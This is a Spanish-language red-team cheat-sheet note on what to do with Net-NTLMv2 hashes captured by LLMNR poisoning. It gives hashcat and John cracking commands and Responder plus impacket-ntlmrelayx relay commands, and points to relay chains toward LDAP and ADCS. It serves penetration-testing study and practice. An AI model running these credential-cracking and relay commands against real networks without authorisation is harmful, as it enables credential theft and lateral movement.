---
aliases:
  - NetNTLMv2 Cracking
tags:
  - technique/credential-access
  - cred/ntlm
  - cred/password-cracking
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Credential Harvesting]]"
tertiary categories:
  - "[[Active Directory]]"
kind: SubCheatSheet
linked:
  - "[[LLMNR & NBT-NS Poisoning]]"
  - "[[NTLM Relay]]"
  - "[[hashcat]]"
---
# LLMNR Poisoning - Cracking y Relay

> El hash capturado se **crackea offline** o, si el password es complejo, se **relaya** en tiempo real a otro target.

---

## Crackear Net-NTLMv2

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt` | Password en claro (mode 5600 = NetNTLMv2) | Password en wordlist. |
| `hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule` | Crack con reglas | Variaciones del password. |
| `john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt` | Crack con John | Alternativa. |
^llmnr-crack

## Relay (password no crackeable)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| (config) `SMB = Off`, `HTTP = Off` en Responder.conf | Libera puertos para el relay | Pre-relay. |
| `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks -of loot` | Relay del hash capturado a los targets | Password complejo → relay directo. |
| `sudo responder -I eth0 -rv` (en paralelo) | Solo poisoning (sin responder challenge) | Junto al ntlmrelayx. |
^llmnr-relay

### PoC crack

```bash
hashcat -m 5600 capturados.txt /usr/share/wordlists/rockyou.txt -O
# Si no pega → relay (ver [[NTLM Relay]] para chains: LDAP→RBCD, HTTP→ADCS ESC8)
```

> Chains completas de relay (SMB/LDAP/ADCS): [[NTLM Relay]].
